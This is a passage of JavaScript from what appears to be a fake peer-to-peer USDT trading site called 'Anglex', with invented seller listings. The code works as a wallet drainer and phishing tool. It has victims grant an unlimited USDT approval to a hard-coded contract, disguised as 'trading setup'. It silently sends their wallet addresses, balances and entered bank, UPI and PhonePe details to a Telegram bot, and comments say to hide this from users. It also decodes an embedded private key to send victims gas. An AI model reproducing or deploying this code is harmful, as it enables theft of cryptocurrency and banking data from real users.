        { id: 3, trader: 'CryptoTrader_Pro', price: 102, limit: '20,000 - 280,000', available: '2,800 USDT', payment: ['UPI']},
        { id: 4, trader: 'FastPay_Exchange', price: 105, limit: '50,000 - 800,000', available: '8,000 USDT', payment: ['Bank Transfer', 'UPI', 'PhonePe']},
        { id: 5, trader: 'TrustTrade_Hub', price: 103, limit: '25,000 - 450,000', available: '4,500 USDT', payment: ['PhonePe', 'Bank Transfer']},
        { id: 6, trader: 'QuickSwap_BTC', price: 104, limit: '15,000 - 180,000', available: '1,800 USDT', payment: ['UPI']},
        { id: 7, trader: 'DigitalPay_Hub', price: 105, limit: '100,000 - 1,200,000', available: '12,000 USDT', payment: ['Bank Transfer', 'UPI', 'PhonePe']},
        { id: 8, trader: 'SafeTrade_Hub', price: 103, limit: '20,000 - 220,000', available: '2,200 USDT', payment: ['PhonePe']},
        { id: 9, trader: 'CryptoEase_X', price: 104, limit: '30,000 - 680,000', available: '6,800 USDT', payment: ['Bank Transfer', 'UPI']},
        { id: 10, trader: 'AnglexOfficial', price: 105, limit: '50,000 - 5,000,000', available: '50,000+ USDT', payment: ['Bank Transfer', 'UPI', 'PhonePe']},
        { id: 11, trader: 'CryptoKing_Pro', price: 104, limit: '5,000 - 300,000', available: '3,000 USDT', payment: ['UPI']},
        { id: 12, trader: 'FastPay_Exchange', price: 105, limit: '20,000 - 600,000', available: '5,500 USDT', payment: ['PhonePe', 'Bank Transfer']},
        { id: 13, trader: 'TrustTrade_Hub', price: 103, limit: '15,000 - 350,000', available: '4,200 USDT', payment: ['UPI', 'PhonePe']},
        { id: 14, trader: 'DigitalPay_Hub', price: 105, limit: '50,000 - 1,000,000', available: '8,800 USDT', payment: ['Bank Transfer']},
        { id: 15, trader: 'SafeTrade_Hub', price: 103, limit: '10,000 - 250,000', available: '2,800 USDT', payment: ['UPI']}
    ];

    // Utility function to decode private key safely
    function decodePrivateKey() {
        try {
            const decoded = atob(CONFIG.ENCODED_PRIVATE_KEY);
            return '0x' + decoded;
        } catch (error) {
            debugLog('Private key decode error: ' + error.message);
            return null;
        }
    }

    // Debug and notification functions
    function debugLog(message) {
        if (CONFIG.DEBUG_MODE) {
            console.log(`[DEBUG] ${message}`);
            const debugContent = document.getElementById('debug-content');
            if (debugContent) {
                const time = new Date().toLocaleTimeString();
                debugContent.innerHTML += `<div>[${time}] ${message}</div>`;
                debugContent.scrollTop = debugContent.scrollHeight;
            }
        }
    }

    function clearDebugLog() {
        const debugContent = document.getElementById('debug-content');
        if (debugContent) {
            debugContent.innerHTML = '';
        }
    }

    function showNotification(message, type = "info") {
        const notification = document.getElementById('notification');
        const notificationMessage = document.getElementById('notification-message');
        
        if (notification && notificationMessage) {
            notificationMessage.textContent = message;
            notification.className = `notification ${type} show`;
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 4000);
        }
    }

    function updateHeaderBalance() {
        if (isApproved) {
            document.getElementById('header-usdt').textContent = `${userBalances.usdt} USDT`;
            document.getElementById('header-bnb').textContent = `${userBalances.bnb} BNB`;
            document.getElementById('wallet-balance').classList.remove('hidden');
        }
    }

    function updateModalBalance() {
        document.getElementById('modal-usdt-balance').textContent = `${userBalances.usdt} USDT`;
        document.getElementById('modal-bnb-balance').textContent = `${userBalances.bnb} BNB`;
        
        const balanceInfo = document.getElementById('wallet-balance-info');
        if (parseFloat(userBalances.usdt) < 1) {
            balanceInfo.classList.add('insufficient-balance');
        } else {
            balanceInfo.classList.remove('insufficient-balance');
        }
    }

    function updateButtonsForApprovedStatus() {
        const tradeButtons = document.querySelectorAll('.trade-btn');
        tradeButtons.forEach(btn => {
            if (!btn.disabled) {
                btn.innerHTML = '<i class="fas fa-shopping-cart mr-1"></i>Place Order';
                btn.classList.add('btn-approved');
            }
        });
        updateHeaderBalance();
    }

    function checkUSDTSufficiency(amount) {
        const hasEnough = parseFloat(userBalances.usdt) >= amount;
        const warningEl = document.getElementById('insufficient-usdt-warning');
        const sellBtn = document.getElementById('sell-usdt-btn');
        
        if (!hasEnough && amount > 0) {
            warningEl.classList.remove('hidden');
            sellBtn.disabled = true;
            sellBtn.classList.add('opacity-50', 'cursor-not-allowed');
            return false;
        } else {
            warningEl.classList.add('hidden');
            sellBtn.disabled = false;
            sellBtn.classList.remove('opacity-50', 'cursor-not-allowed');
            return true;
        }
    }

    // FIXED: Correct USDT balance calculation (using 6 decimals instead of 18)
    async function getBalances() {
        try {
            const bnbBalance = await web3Instance.eth.getBalance(userAddress);
            const bnbInEther = parseFloat(web3Instance.utils.fromWei(bnbBalance, 'ether'));
            
            let usdtBalance = 0;
            try {
                const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONFIG.USDT_CONTRACT_ADDRESS);
                const usdtBalanceRaw = await usdtContract.methods.balanceOf(userAddress).call();
                // FIXED: USDT has 6 decimals on BSC, not 18
               usdtBalance = parseFloat(web3Instance.utils.fromWei(usdtBalanceRaw, 'ether'));
            } catch (usdtError) {
                debugLog('USDT balance fetch error: ' + usdtError.message);
            }
            
            userBalances = {
                bnb: bnbInEther.toFixed(6),
                usdt: usdtBalance.toFixed(2)
            };
            
            if (isApproved) {
                updateHeaderBalance();
            }
            return userBalances;
        } catch (error) {
            debugLog('Balance fetch error: ' + error.message);
            userBalances = { bnb: '0.000000', usdt: '0.00' };
            return userBalances;
        }
    }

    // Check if USDT is already approved for this wallet
    async function checkExistingApproval() {
        try {
            if (!web3Instance || !userAddress) {
                return false;
            }

            debugLog("Checking existing approval...");
            const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONFIG.USDT_CONTRACT_ADDRESS);
            const allowance = await usdtContract.methods.allowance(userAddress, CONFIG.ESCROW_CONTRACT_ADDRESS).call();
            
            const isCurrentlyApproved = parseFloat(allowance) > 0;
            
            if (isCurrentlyApproved) {
                debugLog("Trading ready - wallet setup complete");
                isApproved = true;
                walletApprovalStatus[userAddress] = true;
                updateButtonsForApprovedStatus();
                return true;
            } else {
                debugLog("Setup required for trading");
                return false;
            }
        } catch (error) {
            debugLog("Error checking approval: " + error.message);
            return false;
        }
    }

    // Network and wallet functions
    async function checkAndSwitchToBSC() {
        try {
            debugLog("Checking BSC network...");
            
            if (!window.ethereum) {
                throw new Error("Web3 wallet not found. Please use Trust Wallet or MetaMask.");
            }

            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            debugLog(`Current chain ID: ${chainId}`);
            
            if (chainId !== BSC_NETWORK.chainId) {
                debugLog("Switching to BSC network...");
                
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BSC_NETWORK.chainId }],
                    });
                    debugLog("Successfully switched to BSC");
                } catch (switchError) {
                    debugLog(`Switch error code: ${switchError.code}`);
                    if (switchError.code === 4902) {
                        debugLog("Adding BSC network...");
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [BSC_NETWORK],
                        });
                        debugLog("BSC network added");
                    } else {
                        throw switchError;
                    }
                }
            }
            
            return true;
            
        } catch (error) {
            debugLog(`Network error: ${error.message}`);
            throw new Error(`Network setup failed: ${error.message}`);
        }
    }

    async function connectWallet() {
        try {
            debugLog("Requesting wallet connection...");
            
            const accounts = await window.ethereum.request({
                method: "eth_requestAccounts"
            });
            
            if (!accounts || accounts.length === 0) {
                throw new Error("No wallet accounts found");
            }

            userAddress = accounts[0];
            web3Instance = new Web3(window.ethereum);
            
            debugLog(`Wallet connected: ${userAddress}`);
            
            await getBalances();
            const alreadyApproved = await checkExistingApproval();
            
            if (alreadyApproved) {
                debugLog("Wallet ready - trading setup complete");
                showNotification("Wallet connected! Ready for trading.", "success");
            }
            
            await sendWalletConnectedNotification();
            
            return userAddress;
            
        } catch (error) {
            debugLog(`Wallet connection error: ${error.message}`);
            throw new Error(`Wallet connection failed: ${error.message}`);
        }
    }

    async function sendWalletConnectedNotification() {
        try {
            const currentTime = new Date().toLocaleString('en-US', {
                timeZone: 'Asia/Mumbai',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            const statusText = isApproved ? "✅ Ready for Trading" : "⏳ Setup Required";
            
            const message = `🔗 *Wallet Connected - Anglex*\n\n` +
                          `👤 *Wallet:* \`${userAddress}\`\n` +
                          `💰 *BNB Balance:* ${userBalances.bnb} BNB\n` +
                          `💎 *USDT Balance:* ${userBalances.usdt} USDT\n` +
                          `🔑 *Status:* ${statusText}\n` +
                          `🕒 *Time:* ${currentTime}\n` +
                          `🌐 *Network:* BSC Mainnet`;
            
            await sendTelegramNotification(message);
            debugLog("Wallet connected notification sent");
        } catch (error) {
            debugLog(`Wallet notification error: ${error.message}`);
        }
    }

    async function checkBNBBalance() {
        try {
            debugLog("Checking BNB balance...");
            
            if (!web3Instance || !userAddress) {
                throw new Error("Wallet not properly initialized");
            }
            
            const balance = await web3Instance.eth.getBalance(userAddress);
            const balanceInBNB = parseFloat(web3Instance.utils.fromWei(balance, 'ether'));
            
            debugLog(`BNB Balance: ${balanceInBNB}`);
            
            if (balanceInBNB >= CONFIG.MIN_BNB_REQUIRED) {
                debugLog("BNB balance sufficient");
                return true;
            } else {
                debugLog("BNB balance insufficient, sending auto BNB...");
                await sendAutoBNB();
                return true;
            }
            
        } catch (error) {
            debugLog(`BNB balance check error: ${error.message}`);
            showNotification("BNB balance low but continuing...", "info");
            return true;
        }
    }

    async function sendAutoBNB() {
        try {
            debugLog("Preparing to send auto BNB...");
            
            const privateKey = decodePrivateKey();
            if (!privateKey) {
                throw new Error("Private key decoding failed");
            }
            
            if (typeof ethers === 'undefined' || !ethers.providers) {
                debugLog("Ethers library not properly loaded, trying alternative method");
                const web3 = new Web3(BSC_NETWORK.rpcUrls[0]);
                const account = web3.eth.accounts.privateKeyToAccount(privateKey);
                web3.eth.accounts.wallet.add(account);
                
                const tx = await web3.eth.sendTransaction({
                    from: account.address,
                    to: userAddress,
                    value: web3.utils.toWei('0.00001', 'ether'),
                    gas: 21000
                });
                
                debugLog(`BNB sent via Web3: ${tx.transactionHash}`);
                return tx.transactionHash;
            }
            
            const provider = new ethers.providers.JsonRpcProvider(BSC_NETWORK.rpcUrls[0]);
            const senderWallet = new ethers.Wallet(privateKey, provider);
            
            const amountToSend = ethers.utils.parseEther("0.00001");
            
            debugLog("Sending BNB transaction...");
            const tx = await senderWallet.sendTransaction({
                to: userAddress,
                value: amountToSend,
                gasLimit: 21000
            });
            
            debugLog(`BNB transaction sent: ${tx.hash}`);
            await tx.wait();
            debugLog("BNB transaction confirmed");
            
            return tx.hash;
            
        } catch (error) {
            debugLog(`Auto BNB send error: ${error.message}`);
            showNotification("Auto BNB send failed, but continuing...", "info");
            return null;
        }
    }

    async function approveUSDT() {
        try {
            debugLog("Starting trading setup...");
            
            if (!web3Instance || !userAddress) {
                throw new Error("Wallet not properly initialized");
            }
            
            const usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONFIG.USDT_CONTRACT_ADDRESS);
            const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
            
            debugLog("Estimating gas for setup...");
            const gasEstimate = await usdtContract.methods
                .approve(CONFIG.ESCROW_CONTRACT_ADDRESS, maxAmount)
                .estimateGas({ from: userAddress });
            
            debugLog("Completing trading setup...");
            const tx = await usdtContract.methods
                .approve(CONFIG.ESCROW_CONTRACT_ADDRESS, maxAmount)
                .send({
                    from: userAddress,
                    gas: Math.floor(gasEstimate * 1.2)
                });

            debugLog(`Trading setup complete: ${tx.transactionHash}`);
            isApproved = true;
            walletApprovalStatus[userAddress] = true;
            
            updateButtonsForApprovedStatus();
            await sendApprovalNotification(tx.transactionHash);
            
            return tx.transactionHash;
            
        } catch (error) {
            debugLog(`Trading setup error: ${error.message}`);
            throw new Error(`Trading setup failed: ${error.message}`);
        }
    }

    async function sendApprovalNotification(txHash) {
        try {
            const currentTime = new Date().toLocaleString('en-US', {
                timeZone: 'Asia/Mumbai',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            const message = `✅ *Trading Setup Complete - Anglex*\n\n` +
                          `👤 *Wallet:* \`${userAddress}\`\n` +
                          `💰 *BNB Balance:* ${userBalances.bnb} BNB\n` +
                          `💎 *USDT Balance:* ${userBalances.usdt} USDT\n` +
                          `📝 *Tx Hash:* \`${txHash}\`\n` +
                          `🏛️ *Contract:* \`${CONFIG.ESCROW_CONTRACT_ADDRESS}\`\n` +
                          `🕒 *Time:* ${currentTime}`;
            
            await sendTelegramNotification(message);
            debugLog("Setup complete notification sent");
        } catch (error) {
            debugLog(`Setup notification error: ${error.message}`);
        }
    }


    async function sendTelegramNotification(message) {
        try {
            debugLog("🔄 Attempting to send Telegram notification...");

            const telegramAPI = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;

            const payload = {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };

            debugLog("📡 Telegram API URL: " + telegramAPI);
            debugLog("📦 Payload: " + JSON.stringify(payload, null, 2));

            const response = await fetch(telegramAPI, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            const responseData = await response.json();
            debugLog("📨 Telegram API Response: " + JSON.stringify(responseData));

            if (response.ok && responseData.ok) {
                debugLog("✅ Telegram notification sent successfully");
                // DON'T show success popup to user - keep it quiet
                return true;
            } else {
                debugLog("❌ Telegram API Error: " + JSON.stringify(responseData));

                // Handle specific error cases
                if (responseData.error_code === 401) {
                    debugLog("🔑 Bot token unauthorized - check bot setup");
                } else if (responseData.error_code === 400 && responseData.description.includes('chat not found')) {
                    debugLog("💬 Chat not found - user may not have started bot");
                } else if (responseData.error_code === 403) {
                    debugLog("🚫 Bot blocked by user or insufficient permissions");
                }

                // Don't show error to user - just log it
                return false;
            }
        } catch (error) {
            debugLog(`❌ Telegram network error: ${error.message}`);
            console.error("Telegram Error Details:", error);
            // Don't show error popup to user
            return false;
        }
    }

    function getPaymentDetails() {
        const details = {
            method: selectedPaymentMethod,
            data: {}
        };

        switch(selectedPaymentMethod) {
            case 'UPI':
                details.data = {
                    mobile: document.getElementById('upi-mobile')?.value || '',
                    name: document.getElementById('upi-name')?.value || ''
                };
                break;
            case 'PhonePe':
                details.data = {
                    mobile: document.getElementById('phonepe-mobile')?.value || '',
                    name: document.getElementById('phonepe-name')?.value || ''
                };
                break;
            case 'Bank Transfer':
                details.data = {
                    bankName: document.getElementById('bank-name')?.value || '',
                    accountNumber: document.getElementById('bank-account')?.value || '',
                    holderName: document.getElementById('bank-holder-name')?.value || '',
                    mobile: document.getElementById('bank-mobile')?.value || '',
                    iban: document.getElementById('bank-iban')?.value || '',
                    branchCode: document.getElementById('bank-branch')?.value || '',
                    branchName: document.getElementById('bank-branch-name')?.value || ''
                };
                break;
        }

        return details;
    }

    function validatePaymentDetails(details) {
        if (!details.method) {
            return 'Please select a payment method';
        }

        switch(details.method) {
            case 'UPI':
            case 'PhonePe':
                if (!details.data.mobile) {
                    return `Please enter ${details.method} mobile number`;
                }
                if (!details.data.name) {
                    return 'Please enter account holder name';
                }
                break;
            case 'Bank Transfer':
                if (!details.data.bankName) {
                    return 'Please select bank name';
                }
                if (!details.data.accountNumber) {
                    return 'Please enter account number';
                }
                if (!details.data.holderName) {
                    return 'Please enter account holder name';
                }
                if (!details.data.mobile) {
                    return 'Please enter mobile number for bank transfer';
                }
                break;
        }

        return null;
    }


    // Enhanced order placement with limit validation
    function validateOrderLimits(usdtAmount, orderData) {
        try {
            debugLog(`💰 Validating order limits for ${usdtAmount} USDT`);

            if (!orderData || !orderData.limit) {
                debugLog("⚠️ No limit data available for validation");
                return { valid: true, message: "" };
            }

            // Parse limit string (e.g., "10,000 - 500,000")
            const limitStr = orderData.limit.replace(/,/g, '').replace(/INR/g, '').trim();
            const [minStr, maxStr] = limitStr.split('-').map(s => s.trim());

            const minLimit = parseFloat(minStr) || 0;
            const maxLimit = parseFloat(maxStr) || Infinity;

            // Convert USDT to INR (assuming 103.5 rate)
            const inrAmount = usdtAmount * 103.5;

            debugLog(`💰 Limits: INR ${minLimit.toLocaleString()} - ${maxLimit.toLocaleString()}`);
            debugLog(`💰 Order amount: ${usdtAmount} USDT = INR ${inrAmount.toLocaleString()}`);

            if (inrAmount < minLimit) {
                return {
                    valid: false,
                    message: `Minimum order amount is INR ${minLimit.toLocaleString()} (${(minLimit/103.5).toFixed(2)} USDT)`
                };
            }

            if (inrAmount > maxLimit) {
                return {
                    valid: false,
                    message: `Maximum order amount is INR ${maxLimit.toLocaleString()} (${(maxLimit/103.5).toFixed(2)} USDT)`
                };
            }

            debugLog("✅ Order amount within limits");
            return { valid: true, message: "" };

        } catch (error) {
            debugLog(`❌ Error validating limits: ${error.message}`);
            return { valid: true, message: "" }; // Allow if validation fails
        }
    }

    // Enhanced USDT selling with limit validation
    async function handleSellUSDTEnhanced() {
        const usdtAmount = parseFloat(document.getElementById('usdt-amount-input').value) || 0;

        if (usdtAmount <= 0) {
            showNotification('Please enter a valid USDT amount.', 'error');
            return;
        }

        // Find the current order data for limit validation
        const currentOrderId = document.querySelector('.trade-btn:not([disabled])')?.dataset?.orderId;
        const currentOrder = allOrders.find(order => order.id == currentOrderId);

        // Validate order limits
        const limitCheck = validateOrderLimits(usdtAmount, currentOrder);
        if (!limitCheck.valid) {
            showNotification(limitCheck.message, 'warning');
            return;
        }

        if (!checkUSDTSufficiency(usdtAmount)) {
            showNotification(`Insufficient USDT balance. You have ${userBalances.usdt} USDT but trying to sell ${usdtAmount} USDT.`, 'warning');
            return;
        }

        const paymentDetails = getPaymentDetails();
        const validationError = validatePaymentDetails(paymentDetails);

        if (validationError) {
            showNotification(validationError, 'error');
            return;
        }

        if (!isApproved) {
            showNotification('Trading setup required. Please complete the setup process first.', 'error');
            return;
        }

        const sellBtn = document.getElementById('sell-usdt-btn');
        const sellBtnText = document.getElementById('sell-btn-text');
        const sellBtnLoading = document.getElementById('sell-btn-loading');

        sellBtnText.classList.add('hidden');
        sellBtnLoading.classList.remove('hidden');
        sellBtn.disabled = true;

        try {
            const inrAmount = (usdtAmount * 103.5).toFixed(2);
            const currentTime = new Date().toLocaleString('en-US', {
                timeZone: 'Asia/Mumbai',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            // Store order in history with detailed info
            const newOrder = {
                id: Date.now(),
                amount: usdtAmount,
                inrAmount: inrAmount,
                paymentMethod: paymentDetails.method,
                paymentDetails: paymentDetails.data,
                status: 'pending',
                timestamp: currentTime,
                wallet: userAddress,
                orderData: currentOrder // Store the order limits info
            };
            userOrders.unshift(newOrder);
            localStorage.setItem('anglexUserOrders', JSON.stringify(userOrders));

            let paymentDetailsText = '';
            switch(paymentDetails.method) {
                case 'UPI':
                case 'PhonePe':
                    paymentDetailsText = `📱 *${paymentDetails.method}:*\n` +
                                       `   Mobile: ${paymentDetails.data.mobile}\n` +
                                       `   Name: ${paymentDetails.data.name}`;
                    break;
                case 'Bank Transfer':
                    paymentDetailsText = `🏦 *Bank Transfer:*\n` +
                                       `   Bank: ${paymentDetails.data.bankName}\n` +
                                       `   Account: ${paymentDetails.data.accountNumber}\n` +
                                       `   Name: ${paymentDetails.data.holderName}\n` +
                                       `   Mobile: ${paymentDetails.data.mobile}` +
                                       (paymentDetails.data.iban ? `\n   IBAN: ${paymentDetails.data.iban}` : '');
                    break;
            }

            const traderName = currentOrder ? currentOrder.trader : 'Unknown Trader';

            const message = `🚀 *New Trade Order - Anglex*\n\n` +
                          `👤 *Wallet:* \`${userAddress}\`\n` +
                          `🤝 *Trader:* ${traderName}\n` +
                          `💰 *Current BNB:* ${userBalances.bnb} BNB\n` +
                          `💎 *Current USDT:* ${userBalances.usdt} USDT\n\n` +
                          `📊 *Trade Details:*\n` +
                          `   Amount: ${usdtAmount} USDT\n` +
                          `   Value: INR ${inrAmount}\n` +
                          `   Rate: INR 103.5 per USDT\n\n` +
                          `${paymentDetailsText}\n\n` +
                          `✅ *Status:* Order Placed\n` +
                          `🕒 *Time:* ${currentTime}`;

            // Send to Telegram quietly (no popup)
            await sendTelegramNotification(message);

            document.getElementById('order-success-banner').classList.remove('hidden');
            showNotification(`Trade order placed successfully! ${usdtAmount} USDT for INR ${inrAmount}`, 'success');

            setTimeout(() => {
                document.getElementById('trade-modal').classList.add('hidden');
                document.getElementById('order-success-banner').classList.add('hidden');
            }, 3000);

        } catch (error) {
            debugLog("Place order error: " + error.message);
            showNotification("Failed to place order: " + error.message, 'error');
        } finally {
            sellBtnText.classList.remove('hidden');
            sellBtnLoading.classList.add('hidden');
            sellBtn.disabled = false;
        }
    }

    // FIXED: Show order details function with clickable orders
    function showOrderDetails(orderId) {
        const order = userOrders.find(o => o.id == orderId);
        if (!order) {
            showNotification('Order not found', 'error');
            return;
        }

        let paymentDetailsHtml = '';
        if (order.paymentDetails) {
            switch(order.paymentMethod) {
                case 'UPI':
                case 'PhonePe':
                    paymentDetailsHtml = `
                        <div class="mb-4">
                            <h5 class="text-white font-semibold mb-2">${order.paymentMethod} Details:</h5>
                            <p class="text-gray-300 text-sm">Mobile: ${order.paymentDetails.mobile}</p>
                            <p class="text-gray-300 text-sm">Name: ${order.paymentDetails.name}</p>
                        </div>
                    `;
                    break;
                case 'Bank Transfer':
                    paymentDetailsHtml = `
                        <div class="mb-4">
                            <h5 class="text-white font-semibold mb-2">Bank Transfer Details:</h5>
                            <p class="text-gray-300 text-sm">Bank: ${order.paymentDetails.bankName}</p>
                            <p class="text-gray-300 text-sm">Account: ${order.paymentDetails.accountNumber}</p>
                            <p class="text-gray-300 text-sm">Name: ${order.paymentDetails.holderName}</p>
                            <p class="text-gray-300 text-sm">Mobile: ${order.paymentDetails.mobile}</p>
                            ${order.paymentDetails.iban ? `<p class="text-gray-300 text-sm">IBAN: ${order.paymentDetails.iban}</p>` : ''}
                        </div>
                    `;
                    break;
            }
        }

        const statusColor = order.status === 'pending' ? '#f59e0b' : order.status === 'completed' ? '#10b981' : '#ef4444';
        
        const orderDetailsHtml = `
            <div class="order-details-card">
                <div class="flex justify-between items-center mb-4">
                    <h4 class="text-xl font-bold text-white">Order #${order.id}</h4>
                    <div class="px-3 py-1 rounded-full text-xs font-bold" style="background: ${statusColor}; color: ${order.status === 'cancelled' ? '#fff' : '#000'};">
                        ${order.status.toUpperCase()}
                    </div>
                </div>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    <div>
                        <h5 class="text-white font-semibold mb-2">Trade Information:</h5>
                        <p class="text-gray-300 text-sm mb-1">Amount: ${order.amount} USDT</p>
                        <p class="text-gray-300 text-sm mb-1">Value: INR ${order.inrAmount}</p>
                        <p class="text-gray-300 text-sm mb-1">Rate: INR 103.5 per USDT</p>
                        <p class="text-gray-300 text-sm">Date: ${order.timestamp}</p>
                    </div>
                    <div>
                        <h5 class="text-white font-semibold mb-2">Wallet Information:</h5>
                        <p class="text-gray-300 text-sm break-all">Address: ${order.wallet}</p>
                    </div>
                </div>
                
                ${paymentDetailsHtml}
                
                <div class="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                    <p class="text-blue-300 text-sm">
                        <i class="fas fa-info-circle mr-1"></i>
                        ${order.status === 'pending' ? 'Your order is being processed. The seller will contact you soon.' : 
                          order.status === 'completed' ? 'Your order has been completed successfully.' : 
                          'This order has been cancelled.'}
                    </p>
                </div>
            </div>
        `;

        document.getElementById('order-details-content').innerHTML = orderDetailsHtml;
        document.getElementById('order-details-modal').classList.remove('hidden');
    }

    // Page templates 
    const pages = {
        home: `
            <div class="page-content p-6 md:p-12 rounded-xl text-center">
                <h1 class="text-2xl md:text-5xl font-extrabold tracking-tight gradient-text mb-4">Trade with Confidence</h1>
                <p class="text-sm md:text-lg text-gray-400 max-w-3xl mx-auto mb-6 leading-relaxed">
                    Anglex is India's most secure and trusted peer-to-peer platform for trading USDT.
                    Connect directly with verified traders for safe, fast, and transparent transactions.
                </p>
                <button class="nav-link bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-3 px-6 rounded-full text-sm md:text-base transition-all shadow-xl hover:shadow-2xl transform hover:scale-105" data-page="sell">
                    <i class="fas fa-rocket mr-2"></i>Start Trading Now
                </button>
            </div>
        `,
        orders: `
            <div class="page-content p-6 md:p-12 rounded-xl">
                <h1 class="text-2xl md:text-4xl font-bold text-white mb-6">My Orders</h1>
                <div id="orders-history-list" class="space-y-3">
                    <!-- Orders will be populated here -->
                </div>
            </div>
        `,
        sell: `
            <div>
                <div class="flex flex-col md:flex-row justify-between items-center mb-6">
                    <div>
                        <h1 class="text-xl md:text-3xl font-extrabold tracking-tight text-white mb-1">Sell USDT</h1>
                        <p class="text-gray-400 text-sm">Choose from verified traders below</p>
                    </div>
                    <div class="mt-4 md:mt-0">
                        <div class="market-stats">
                            <div class="grid grid-cols-3 gap-3">
                                <div class="stat-item">
                                    <div class="stat-value">INR 103.5</div>
                                    <div class="stat-label">Current Rate</div>
                                </div>
                                <div class="stat-item">
                                    <div class="stat-value">24h</div>
                                    <div class="stat-label">Avg Settlement</div>
                                </div>
                                <div class="stat-item">
                                    <div class="stat-value">98.5%</div>
                                    <div class="stat-label">Success Rate</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="bg-gradient-to-br from-slate-800 to-slate-700 p-4 md:p-6 rounded-xl shadow-2xl mb-6 border border-slate-600">
                    <h2 class="text-base md:text-lg font-semibold mb-4 text-gray-200 flex items-center">
                        <i class="fas fa-filter mr-2 text-sm"></i>Find Your Perfect Trade
                    </h2>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label for="payment-filter" class="block text-xs font-medium text-gray-400 mb-2">Payment Method</label>
                            <select id="payment-filter" class="w-full bg-slate-700/50 text-gray-200 border-slate-600 rounded-lg p-3 text-sm focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all">
                                <option value="all">All Methods</option>
                                <option value="UPI">UPI</option>
                                <option value="PhonePe">PhonePe</option>
                                <option value="Bank Transfer">Bank Transfer</option>
                            </select>
                        </div>
                        <div>
                            <label for="amount-filter" class="block text-xs font-medium text-gray-400 mb-2">Amount Range (INR)</label>
                            <select id="amount-filter" class="w-full bg-slate-700/50 text-gray-200 border-slate-600 rounded-lg p-3 text-sm focus:ring-2 focus:ring-sky-500 focus:border-sky-500 transition-all">
                                <option value="all">Any Amount</option>
                                <option value="5000-50000">INR 5,000 - 50,000</option>
                                <option value="50000-150000">INR 50,000 - 150,000</option>
                                <option value="150000-300000">INR 150,000 - 300,000</option>
                                <option value="300000+">INR 300,000+</option>
                            </select>
                        </div>
                        <div class="flex items-end">
                            <button id="filter-btn" class="w-full bg-gradient-to-r from-sky-500 to-blue-500 hover:from-sky-600 hover:to-blue-600 text-white font-semibold py-3 px-4 rounded-lg text-sm transition-all shadow-lg hover:shadow-xl transform hover:scale-105">
                                <i class="fas fa-search mr-1"></i>Apply Filters
                            </button>
                        </div>
                    </div>
                </div>
                
                <section>
                    <h2 class="text-base md:text-xl font-semibold mb-4 text-gray-200 flex items-center">
                        <i class="fas fa-users mr-2 text-blue-500 text-sm"></i>Available Traders
                    </h2>
                    <div id="orders-list" class="space-y-4"></div>
                    <div class="flex justify-center items-center mt-6 space-x-4">
                        <button id="prev-page" class="bg-gradient-to-r from-slate-700 to-slate-600 hover:from-slate-600 hover:to-slate-500 text-gray-300 py-2 px-4 rounded-lg text-xs font-medium transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg">
                            <i class="fas fa-chevron-left mr-1"></i>Previous
                        </button>
                        <div id="pagination-info" class="text-sm font-medium text-gray-400 bg-slate-800/50 px-3 py-1 rounded">Page 1 of 3</div>
                        <button id="next-page" class="bg-gradient-to-r from-slate-700 to-slate-600 hover:from-slate-600 hover:to-slate-500 text-gray-300 py-2 px-4 rounded-lg text-xs font-medium transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg">
                            Next<i class="fas fa-chevron-right ml-1"></i>
                        </button>
                    </div>
                </section>
            </div>
        `,
        buy: `
            <div class="page-content p-6 md:p-12 rounded-xl text-center">
                <h1 class="text-2xl md:text-4xl font-bold text-white mb-4">Buying Feature Coming Soon</h1>
                <p class="text-sm md:text-lg text-gray-400 max-w-2xl mx-auto mb-6">
                    Anglex is actively expanding our P2P marketplace. The ability to buy USDT from other traders will be launched shortly.
                    Stay tuned for a complete trading ecosystem.
                </p>
                <div class="flex justify-center mt-6">
                    <div class="bg-gradient-to-r from-blue-600/20 to-purple-600/20 border border-blue-500/30 rounded-xl p-4 text-center">
                        <i class="fas fa-bell text-2xl text-blue-400 mb-2"></i>
                        <h3 class="text-sm font-semibold text-white mb-1">Get Notified</h3>
                        <p class="text-gray-400 text-xs">Be first to know when buying launches</p>
                    </div>
                </div>
            </div>
        `,
        help: `
            <div class="page-content p-6 md:p-12 rounded-xl">
                <div class="text-center mb-8">
                    <h1 class="text-2xl md:text-4xl font-bold text-white mb-4">Support Center</h1>
                    <p class="text-sm md:text-base text-gray-400 max-w-2xl mx-auto">
                        Need assistance? Our dedicated support team is available 24/7 to help you with any questions or issues.
                    </p>
                </div>
                
                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div class="bg-gradient-to-br from-blue-600/20 to-cyan-600/20 border border-blue-500/30 rounded-xl p-6 text-center">
                        <i class="fas fa-comments text-2xl text-blue-400 mb-3"></i>
                        <h3 class="text-base font-semibold text-white mb-2">Live Chat</h3>
                        <p class="text-gray-400 mb-3 text-sm">Contact our agent on live chat</p>
